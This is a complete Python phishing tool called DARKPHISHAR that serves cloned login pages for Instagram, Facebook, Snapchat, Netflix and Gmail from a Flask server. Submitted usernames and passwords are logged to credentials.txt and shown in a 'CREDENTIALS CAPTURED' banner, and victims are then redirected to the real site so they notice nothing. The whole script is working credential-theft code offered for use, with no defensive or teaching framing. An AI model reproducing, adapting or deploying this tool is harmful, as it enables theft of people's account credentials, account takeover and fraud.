#!/usr/bin/env python3
"""
DARKPHISHAR - Advanced Phishing Tool
Developed by: GENIUS HACKER
YouTube: https://www.youtube.com/@geniushacker29
"""

import os
import sys
import time
import socket
import webbrowser
import threading
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory

# Colors
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"

YOUTUBE_URL = "https://www.youtube.com/@geniushacker29"

# Ports
PORTS = {
    'instagram': 8080,
    'facebook': 8081,
    'snapchat': 8082,
    'netflix': 8083,
    'gmail': 8084
}

PLATFORMS = {
    '1': {'name': 'Instagram', 'page': 'instagram', 'port': 8080},
    '2': {'name': 'Facebook', 'page': 'facebook', 'port': 8081},
    '3': {'name': 'Snapchat', 'page': 'snapchat', 'port': 8082},
    '4': {'name': 'Netflix', 'page': 'netflix', 'port': 8083},
    '5': {'name': 'Gmail', 'page': 'gmail', 'port': 8084}
}

# ============================================
# HTML PAGES (Clean)
# ============================================

def get_instagram_html():
    return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 12px;
            max-width: 380px;
            width: 100%;
            text-align: center;
            border: 1px solid #dbdbdb;
        }
        .logo { font-size: 48px; font-weight: 700; color: #262626; margin-bottom: 5px; }
        .sub-logo { color: #8e8e8e; font-size: 14px; margin-bottom: 15px; }
        input {
            width: 100%;
            padding: 12px;
            margin: 6px 0;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover { background: #0077c8; }
        .loader { display: none; margin: 10px auto; border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer { margin-top: 15px; color: #8e8e8e; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <div class="sub-logo">Sign in to see photos from your friends</div>
        <input type="text" id="username" placeholder="Phone number, username, or email">
        <input type="password" id="password" placeholder="Password">
        <div class="loader" id="loader"></div>
        <button onclick="login()">Log In</button>
        <div class="footer">© 2026 Instagram from Meta</div>
    </div>
    <script>
        function login() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            if (!user || !pass) { alert('Please fill all fields'); return; }
            document.getElementById('loader').style.display = 'block';
            document.querySelector('button').disabled = true;
            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: user, password: pass, platform: 'instagram' })
            })
            .then(res => res.json())
            .then(data => {
                document.getElementById('loader').style.display = 'none';
                document.querySelector('button').disabled = false;
                if (data.success) window.location.href = 'https://www.instagram.com';
                else alert('Login failed. Try again.');
            });
        }
    </script>
</body>
</html>'''

def get_facebook_html():
    return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 8px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .logo { font-size: 42px; font-weight: 700; color: #1877f2; margin-bottom: 5px; }
        .sub-logo { color: #606770; font-size: 14px; margin-bottom: 15px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 6px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            margin-top: 10px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover { background: #166fe5; }
        .loader { display: none; margin: 10px auto; border: 3px solid #f3f3f3; border-top: 3px solid #1877f2; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Facebook</div>
        <div class="sub-logo">Connect with friends and the world around you.</div>
        <input type="text" id="username" placeholder="Email or Phone Number">
        <input type="password" id="password" placeholder="Password">
        <div class="loader" id="loader"></div>
        <button onclick="login()">Log In</button>
    </div>
    <script>
        function login() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            if (!user || !pass) return;
            document.getElementById('loader').style.display = 'block';
            document.querySelector('button').disabled = true;
            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: user, password: pass, platform: 'facebook' })
            })
            .then(res => res.json())
            .then(data => {
                document.getElementById('loader').style.display = 'none';
                document.querySelector('button').disabled = false;
                if (data.success) window.location.href = 'https://www.facebook.com';
            });
        }
    </script>
</body>
</html>'''

def get_snapchat_html():
    return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Login</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fffc00;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 20px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .logo { font-size: 42px; font-weight: 700; color: #000; margin-bottom: 5px; }
        .sub-logo { color: #666; font-size: 14px; margin-bottom: 15px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 6px 0;
            border: 2px solid #eee;
            border-radius: 30px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            margin-top: 10px;
            background: #fffc00;
            color: #000;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover { background: #e6e600; }
        .loader { display: none; margin: 10px auto; border: 3px solid #f3f3f3; border-top: 3px solid #fffc00; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Snapchat</div>
        <div class="sub-logo">Snap, chat, and stay connected.</div>
        <input type="text" id="username" placeholder="Username or Email">
        <input type="password" id="password" placeholder="Password">
        <div class="loader" id="loader"></div>
        <button onclick="login()">Log In</button>
    </div>
    <script>
        function login() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            if (!user || !pass) return;
            document.getElementById('loader').style.display = 'block';
            document.querySelector('button').disabled = true;
            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: user, password: pass, platform: 'snapchat' })
            })
            .then(res => res.json())
            .then(data => {
                document.getElementById('loader').style.display = 'none';
                document.querySelector('button').disabled = false;
                if (data.success) window.location.href = 'https://www.snapchat.com';
            });
        }
    </script>
</body>
</html>'''

def get_netflix_html():
    return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Login</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #141414;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: rgba(0,0,0,0.85);
            padding: 40px 30px;
            border-radius: 8px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .logo { font-size: 42px; color: #e50914; font-weight: 700; margin-bottom: 5px; }
        .sub-logo { color: #aaa; font-size: 14px; margin-bottom: 15px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 6px 0;
            background: #333;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            margin-top: 10px;
            background: #e50914;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover { background: #f6121d; }
        .loader { display: none; margin: 10px auto; border: 3px solid #333; border-top: 3px solid #e50914; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Netflix</div>
        <div class="sub-logo">Unlimited movies, TV shows, and more.</div>
        <input type="text" id="username" placeholder="Email or Phone Number">
        <input type="password" id="password" placeholder="Password">
        <div class="loader" id="loader"></div>
        <button onclick="login()">Sign In</button>
    </div>
    <script>
        function login() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            if (!user || !pass) return;
            document.getElementById('loader').style.display = 'block';
            document.querySelector('button').disabled = true;
            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: user, password: pass, platform: 'netflix' })
            })
            .then(res => res.json())
            .then(data => {
                document.getElementById('loader').style.display = 'none';
                document.querySelector('button').disabled = false;
                if (data.success) window.location.href = 'https://www.netflix.com';
            });
        }
    </script>
</body>
</html>'''

def get_gmail_html():
    return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail Login</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f1f3f4;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 8px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .logo { font-size: 40px; color: #1a73e8; font-weight: 700; margin-bottom: 5px; }
        .sub-logo { color: #5f6368; font-size: 14px; margin-bottom: 15px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 6px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }
        input:focus { border-color: #1a73e8; outline: none; }
        button {
            width: 100%;
            padding: 14px;
            margin-top: 10px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover { background: #1557b0; }
        .loader { display: none; margin: 10px auto; border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Gmail</div>
        <div class="sub-logo">Sign in to your Google Account.</div>
        <input type="text" id="username" placeholder="Email or Phone">
        <input type="password" id="password" placeholder="Password">
        <div class="loader" id="loader"></div>
        <button onclick="login()">Next</button>
    </div>
    <script>
        function login() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            if (!user || !pass) return;
            document.getElementById('loader').style.display = 'block';
            document.querySelector('button').disabled = true;
            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: user, password: pass, platform: 'gmail' })
            })
            .then(res => res.json())
            .then(data => {
                document.getElementById('loader').style.display = 'none';
                document.querySelector('button').disabled = false;
                if (data.success) window.location.href = 'https://mail.google.com';
            });
        }
    </script>
</body>
</html>'''

def get_html(platform):
    if platform == 'instagram':
        return get_instagram_html()
    elif platform == 'facebook':
        return get_facebook_html()
    elif platform == 'snapchat':
        return get_snapchat_html()
    elif platform == 'netflix':
        return get_netflix_html()
    elif platform == 'gmail':
        return get_gmail_html()
    return None

# ============================================
# CREATE PAGES
# ============================================
def create_pages(platform_list):
    if not os.path.exists('pages'):
        os.makedirs('pages')
    
    for p in platform_list:
        html = get_html(p)
        if html:
            with open(f'pages/{p}.html', 'w') as f:
                f.write(html)
            print(f"{GREEN}✅ Created: {p}.html{RESET}")

# ============================================
# BANNER
# ============================================
def banner():
    os.system('clear')
    print(f"""{RED}
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗ ██╗███████╗  ║
║   ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██║██╔════╝  ║
║   ██║  ██║███████║██████╔╝█████╔╝ ██████╔╝██║███████╗  ║
║   ██║  ██║██╔══██║██╔═══╝ ██╔═██╗ ██╔══██╗██║╚════██║  ║
║   ██████╔╝██║  ██║██║     ██║  ██╗██║  ██║██║███████║  ║
║   ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝  ║
║                                                          ║
║              DARKPHISHAR TOOL                            ║
║            Developed by: GENIUS HACKER                   ║
╚══════════════════════════════════════════════════════════╝
{RESET}""")

# ============================================
# START FLASK SERVER (Single Script)
# ============================================
def start_server(port, platform, pages_dir):
    app = Flask(__name__)
    
    PLATFORM_NAMES = {
        'instagram': 'Instagram',
        'facebook': 'Facebook',
        'snapchat': 'Snapchat',
        'netflix': 'Netflix',
        'gmail': 'Gmail'
    }
    
    def print_creds(platform_name, user, pwd):
        print(f"""
{GREEN}╔═══════════════════════════════════════════╗
║  🎯 CREDENTIALS CAPTURED!                 ║
╠═══════════════════════════════════════════╣
║  📱 Platform : {platform_name:<20} ║
║  👤 Username : {user:<20} ║
║  🔑 Password : {pwd:<20} ║
║  🕒 Time     : {datetime.now().strftime('%H:%M:%S'):<20} ║
╚═══════════════════════════════════════════╝{RESET}
""")
    
    @app.route('/')
    def index():
        return send_from_directory(pages_dir, f'{platform}.html')
    
    @app.route('/<page>')
    def serve_page(page):
        if '.' in page:
            return send_from_directory(pages_dir, page)
        return send_from_directory(pages_dir, f'{page}.html')
    
    @app.route('/login', methods=['POST'])
    def login():
        data = request.json
        username = data.get('username', 'unknown')
        password = data.get('password', 'unknown')
        platform_key = data.get('platform', 'unknown')
        platform_name = PLATFORM_NAMES.get(platform_key, platform_key.upper())
        
        with open('credentials.txt', 'a') as f:
            f.write(f'[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}] {platform_name} | {username} | {password}\n')
        
        print_creds(platform_name, username, password)
        
        return jsonify({'success': True})
    
    # Run Flask in a thread
    def run():
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
    
    thread = threading.Thread(target=run, daemon=True)
    thread.start()
    time.sleep(1)
    return thread

# ============================================
# MAIN
# ============================================
def main():
    banner()
    
    # Open YouTube
    try:
        webbrowser.open(YOUTUBE_URL)
        print(f"{GREEN}✅ Opening YouTube: {YOUTUBE_URL}{RESET}\n")
    except:
        print(f"{YELLOW}⚠️ Could not open YouTube. Please visit: {YOUTUBE_URL}{RESET}\n")
    
    time.sleep(1)
    
    print(f"{YELLOW}📌 SELECT PLATFORM:{RESET}")
    print(f"{CYAN}1. Instagram  📸 (Port 8080){RESET}")
    print(f"{CYAN}2. Facebook   📘 (Port 8081){RESET}")
    print(f"{CYAN}3. Snapchat   👻 (Port 8082){RESET}")
    print(f"{CYAN}4. Netflix    🎬 (Port 8083){RESET}")
    print(f"{CYAN}5. Gmail      📧 (Port 8084){RESET}")
    print(f"{CYAN}6. All Platforms (All Ports){RESET}")
    print(f"{CYAN}7. Exit{RESET}")
    
    choice = input(f"\n{BOLD}➜ {RESET}").strip()
    
    if choice == '7':
        print(f"{YELLOW}👋 Exiting...{RESET}")
        sys.exit(0)
    
    if not os.path.exists('pages'):
        os.makedirs('pages')
    
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except:
        local_ip = "127.0.0.1"
    
    # Single Platform
    if choice in PLATFORMS:
        platform = PLATFORMS[choice]['page']
        port = PORTS[platform]
        name = PLATFORMS[choice]['name']
        
        print(f"{CYAN}📁 Creating phishing page for {name}...{RESET}")
        create_pages([platform])
        
        print(f"{CYAN}🚀 Starting server...{RESET}")
        start_server(port, platform, 'pages')
        
        print(f"""
{GREEN}✅ {name} SERVER STARTED!{RESET}
{CYAN}═══════════════════════════════════════════{RESET}
📡 URL: http://{local_ip}:{port}
📡 Local: http://localhost:{port}
{CYAN}═══════════════════════════════════════════{RESET}
{YELLOW}📥 Waiting for credentials... (They will appear HERE){RESET}
{YELLOW}Press Ctrl+C to stop server{RESET}
""")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{RED}❌ Server stopped{RESET}")
    
    # All Platforms
    elif choice == '6':
        print(f"{CYAN}📁 Creating all phishing pages...{RESET}")
        all_platforms = ['instagram', 'facebook', 'snapchat', 'netflix', 'gmail']
        create_pages(all_platforms)
        
        print(f"{CYAN}🚀 Starting all servers...{RESET}")
        for p in all_platforms:
            port = PORTS[p]
            start_server(port, p, 'pages')
            print(f"{GREEN}✅ {p.capitalize()} running on port {port}{RESET}")
        
        print(f"""
{GREEN}✅ ALL SERVERS STARTED!{RESET}
{CYAN}═══════════════════════════════════════════{RESET}
📡 Instagram  : http://{local_ip}:8080
📡 Facebook   : http://{local_ip}:8081
📡 Snapchat   : http://{local_ip}:8082
📡 Netflix    : http://{local_ip}:8083
📡 Gmail      : http://{local_ip}:8084
{CYAN}═══════════════════════════════════════════{RESET}
{YELLOW}📥 Waiting for credentials... (They will appear HERE){RESET}
{YELLOW}Press Ctrl+C to stop all servers{RESET}
""")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{RED}❌ All servers stopped{RESET}")
    
    else:
        print(f"{RED}❌ Invalid choice!{RESET}")
        main()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}❌ Exited{RESET}")
        sys.exit(0)
